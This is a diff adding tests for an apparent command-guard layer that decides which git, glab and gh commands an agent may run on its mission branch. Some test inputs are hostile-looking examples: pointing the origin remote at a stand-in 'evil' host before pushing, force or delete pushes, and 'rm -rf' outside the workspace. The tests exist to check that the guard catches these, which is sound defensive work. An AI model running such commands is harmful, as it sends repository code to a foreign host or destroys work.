@@ -22,6 +22,10 @@ describe("the effectful actions", () => {
   it("derives each action's gate category from its effects: the literal it replaces", () => {
     expect(ACTION_CATEGORY).toEqual({
       "git push": "release",
+      "glab mr create/update": "release",
+      "glab mr merge": "release",
+      "gh pr create/edit": "release",
+      "gh pr merge": "release",
       "npm publish": "release",
       "pnpm publish": "release",
       "yarn publish": "release",
@@ -50,6 +54,11 @@ describe("the effectful actions", () => {
     const commands = [
       "git push",
       "git -C repo push origin main",
+      "glab mr create --target-branch develop --fill",
+      "glab mr merge 12",
+      "gh pr edit --base develop",
+      "gh pr merge 3",
+      "glab mr view",
       "npm publish --access public",
       "pnpm publish",
       "yarn publish",
@@ -324,6 +333,182 @@ describe("the action boundary's classification", () => {
     expect(dangerOfCommand("rm -rf /tmp/bm-x", null, WS)).toBeNull();
     expect(classifyCommand("rm -rf ../other", WS, `${WS}/src`).action).toBeNull();
     expect(classifyCommand("rm -rf ../../other", WS, `${WS}/src`).action).toBe("rm -rf outside the workspace");
+  });
+});
+
+// ── A placement's branch (delivery line design §4.2) ──
+
+const PLACE = "/Users/owner/.paseo/worktrees/m-abc-fe";
+const ROOT = "/work/frontend";
+const MISSION = { directory: PLACE, branch: "m/ABC/fe", target: "develop", remote: "origin" as const };
+const placed = (overrides: Partial<BoundaryContext> = {}): BoundaryContext => context({ cwd: PLACE, workspaceDirectory: PLACE, mission: MISSION, ...overrides });
+/** Each held finding of a command run in the placement: what, its first effect, and whether the grant may cover it. */
+const rows = (command: string, overrides: Partial<BoundaryContext> = {}) =>
+  boundaryVerdictOfCommand(command, placed(overrides)).findings.map((finding) => ({
+    what: finding.what,
+    effect: finding.unreadable ? "unreadable" : finding.effects[0],
+    covered: finding.integration === true ? "integration" : finding.forgeRead === true ? "forgeRead" : null,
+  }));
+
+describe("git and the forge CLIs in a placement (delivery line design §4.2)", () => {
+  it("a push of the mission branch to origin is integration: the branch, HEAD, or none, with harmless flags only", () => {
+    for (const command of [
+      "git push -u origin m/ABC/fe",
+      "git push origin HEAD",
+      "git push origin",
+      "git push --set-upstream origin HEAD:m/ABC/fe",
+      "git push origin refs/heads/m/ABC/fe:refs/heads/m/ABC/fe",
+      `git -C ${PLACE} push -q origin m/ABC/fe`,
+      "cd src && git push origin m/ABC/fe",
+      "git add -A && git commit -m 'feat: x' && git push -u origin m/ABC/fe",
+    ]) {
+      expect([command, rows(command)]).toEqual([command, [{ what: "git push m/ABC/fe", effect: "push", covered: "integration" }]]);
+    }
+  });
+
+  it("any other push is a push as today: another branch or remote, forced, deleting, all, tags, rewired, or not spelled out", () => {
+    for (const command of [
+      "git push origin main",
+      "git push origin m/ABC/fe:develop",
+      "git push upstream m/ABC/fe",
+      "git push",
+      "git push -f origin m/ABC/fe",
+      "git push --force-with-lease origin m/ABC/fe",
+      "git push origin +m/ABC/fe",
+      "git push origin :m/ABC/fe",
+      "git push --delete origin m/ABC/fe",
+      "git push --mirror origin",
+      "git push --all origin",
+      "git push --tags origin",
+      "git push origin m/ABC/fe develop",
+      "git push origin $BRANCH",
+      "git -c remote.origin.url=git@evil:x.git push origin m/ABC/fe",
+      "GIT_DIR=/work/frontend/.git git push origin m/ABC/fe",
+      `git -C ${ROOT} push origin m/ABC/fe`,
+      "git switch develop && git push origin HEAD",
+      "git remote set-url origin git@evil:x.git && git push origin m/ABC/fe",
+    ]) {
+      expect([command, rows(command).find((row) => row.effect === "push")]).toEqual([command, { what: "git push", effect: "push", covered: null }]);
+    }
+  });
+
+  it("commit, merge, cherry-pick and revert on the mission branch in the placement hold nothing", () => {
+    for (const command of [
+      "git add -A && git commit -m 'feat: the form'",
+      "git merge origin/develop",
+      "git cherry-pick abc1234",
+      "git revert --no-edit abc1234",
+      "git checkout -- src/a.ts",
+      "git checkout src/a.ts",
+      "git checkout HEAD~1 src/a.ts",
+      "git switch m/ABC/fe",
+      "git reset --soft HEAD~1",
+      "git branch --list",
+      "git status && git log -1",
+      "git rebase --abort",
+    ]) {
+      expect([command, rows(command)]).toEqual([command, []]);
+    }
+  });
+
+  it("the same outside the placement is outside-workspace; a folder not spelled out is unreadable", () => {
+    expect(rows(`git -C ${ROOT} commit -m x`)).toEqual([{ what: "git commit outside the mission's worktree", effect: "outside-workspace", covered: null }]);
+    expect(rows(`cd ${ROOT} && git merge origin/develop`)).toEqual([{ what: "git merge outside the mission's worktree", effect: "outside-workspace", covered: null }]);
+    expect(rows("git commit -m x", { cwd: ROOT })).toEqual([{ what: "git commit outside the mission's worktree", effect: "outside-workspace", covered: null }]);
+    expect(rows("cd $DIR && git commit -m x")).toEqual([{ what: "git commit in a folder the command does not spell out", effect: "unreadable", covered: null }]);
+    expect(rows("git $SUB")).toEqual([{ what: "git with a subcommand the command does not spell out", effect: "unreadable", covered: null }]);
+  });
+
+  it("leaving the mission branch is held as a commit: switch, checkout, rebase, reset --hard, branch -D/-m, and a commit after a switch", () => {
+    const off = (sub: string) => ({ what: `git ${sub} off the mission branch`, effect: "commit", covered: null });
+    expect(rows("git switch develop")).toEqual([off("switch")]);
+    expect(rows("git switch -c spike")).toEqual([off("switch")]);
+    expect(rows("git checkout develop")).toEqual([off("checkout")]);
+    expect(rows("git checkout -b spike")).toEqual([off("checkout")]);
+    expect(rows("git rebase origin/develop")).toEqual([off("rebase")]);
+    expect(rows("git reset --hard origin/develop")).toEqual([off("reset")]);
+    expect(rows("git branch -D old")).toEqual([off("branch")]);
+    expect(rows("git branch -m new-name")).toEqual([off("branch")]);
+    expect(rows("git checkout develop && git commit -m x")).toEqual([off("checkout"), off("commit")]);
+    // Back on the mission branch, a commit is the mission's again.
+    expect(rows("git checkout develop && git checkout m/ABC/fe && git commit -m x")).toEqual([off("checkout")]);
+  });
+
+  it("changing a remote writes the repository's shared config: outside-workspace", () => {
+    expect(rows("git remote set-url origin git@evil:x.git")).toEqual([{ what: "git remote set-url (the repository's config, shared with its root checkout)", effect: "outside-workspace", covered: null }]);
+    expect(rows("git config remote.origin.pushurl git@evil:x.git")[0]?.effect).toBe("outside-workspace");
+    expect(rows("git remote -v")).toEqual([]);
+    expect(rows("git config --get remote.origin.url")).toEqual([]);
+  });
+
+  it("glab mr create or update of the mission branch into the integration branch is integration; anything else is not", () => {
+    const covered = (command: string) => rows(command).map((row) => row.covered);
+    expect(covered("glab mr create --target-branch develop --fill --yes")).toEqual(["integration"]);
+    expect(covered("glab mr create -s m/ABC/fe -b develop -t 'feat: x' -d 'body'")).toEqual(["integration"]);
+    expect(covered("glab mr create --source-branch=m/ABC/fe --target-branch=develop --push")).toEqual(["integration"]);
+    expect(covered("glab mr update --title 'feat: y'")).toEqual(["integration"]);
+    expect(covered("glab mr update m/ABC/fe --ready")).toEqual(["integration"]);
+    expect(rows("glab mr update --title y")).toEqual([{ what: "glab mr update", effect: "push", covered: "integration" }]);
+    for (const command of [
+      "glab mr create --fill",
+      "glab mr create --target-branch main --fill",
+      "glab mr create -s other -b develop",
+      "glab mr create -b develop -R group/other",
+      "glab mr create -b develop --some-new-flag",
+      "glab mr create -b $TARGET",
+      "glab mr update 12 --title y",
+      "glab mr update --target-branch main",
+    ]) {
+      expect([command, rows(command)]).toEqual([command, [{ what: rows(command)[0]!.what, effect: "push", covered: null }]]);
+    }
+  });
+
+  it("gh pr create and edit are read like glab's", () => {
+    expect(rows("gh pr create --base develop --fill")).toEqual([{ what: "gh pr create", effect: "push", covered: "integration" }]);
+    expect(rows("gh pr create -B develop -H m/ABC/fe -t x -b body")).toEqual([{ what: "gh pr create", effect: "push", covered: "integration" }]);
+    expect(rows("gh pr edit --title y")).toEqual([{ what: "gh pr edit", effect: "push", covered: "integration" }]);
+    expect(rows("gh pr create --base main")).toEqual([{ what: "gh pr create", effect: "push", covered: null }]);
+    expect(rows("gh pr edit 3 --title y")).toEqual([{ what: "gh pr edit", effect: "push", covered: null }]);
+    expect(rows("gh pr merge 3")).toEqual([{ what: "gh pr merge", effect: "push", covered: null }]);
+  });
+
+  it("merging, approving, closing, CI runs and glab api are never covered; forge reads are forgeRead", () => {
+    expect(rows("glab mr merge 12")).toEqual([{ what: "glab mr merge", effect: "push", covered: null }]);
+    for (const [command, what] of [
+      ["glab mr approve 12", "glab mr approve"],
+      ["glab mr close 12", "glab mr close"],
+      ["glab mr delete 12", "glab mr delete"],
+      ["glab mr rebase 12", "glab mr rebase"],
+      ["glab ci run", "glab ci run"],
+      ["glab ci retry 99", "glab ci retry"],
+      ["glab ci cancel", "glab ci cancel"],
+      ["glab ci delete 99", "glab ci delete"],
+      ["glab api projects/1/merge_requests", "glab api"],
+    ] as const) {
+      expect([command, rows(command)]).toEqual([command, [{ what, effect: "network", covered: null }]]);
+    }
+    for (const command of ["glab mr view", "glab mr list", "glab mr diff 12", "glab ci status", "glab ci view", "glab ci list", "glab ci get", "glab ci trace 5", "glab pipeline list", "glab pipeline status", "glab pipeline view"]) {
+      expect([command, rows(command)]).toEqual([command, [{ what: "glab (read)", effect: "network", covered: "forgeRead" }]]);
+    }
+    // The forge read rows hold outside a placement too: glab is the network.
+    expect(declaredEffectsOf(boundaryVerdictOfCommand("glab mr view", context()).findings)).toEqual(["network"]);
+  });
+
+  it("outside a placement git and the forge request rows are as before, never integration", () => {
+    const plain = (command: string) => boundaryVerdictOfCommand(command, context()).findings;
+    expect(plain("git push -u origin m/ABC/fe")).toEqual([{ what: "git push", effects: ["push"], unreadable: false }]);
+    expect(plain("git checkout develop && git commit -m x")).toEqual([]);
+    expect(plain("glab mr create --target-branch develop --fill")).toEqual([{ what: "glab mr create", effects: ["push"], unreadable: false }]);
+    expect(plain("gh pr create --base develop")).toEqual([{ what: "gh pr create", effects: ["push"], unreadable: false }]);
+  });
+
+  it("the watch and A-6 name the new actions", () => {
+    expect(effectfulActionOf("glab mr create --target-branch develop", PLACE)).toBe("glab mr create/update");
+    expect(effectfulActionOf("glab mr update --title y", PLACE)).toBe("glab mr create/update");
+    expect(effectfulActionOf("glab mr merge 12", PLACE)).toBe("glab mr merge");
+    expect(effectfulActionOf("gh pr create --base develop", PLACE)).toBe("gh pr create/edit");
+    expect(effectfulActionOf("gh pr merge 3", PLACE)).toBe("gh pr merge");
+    expect(effectfulActionOf("glab mr view", PLACE)).toBeNull();
   });
 });
 
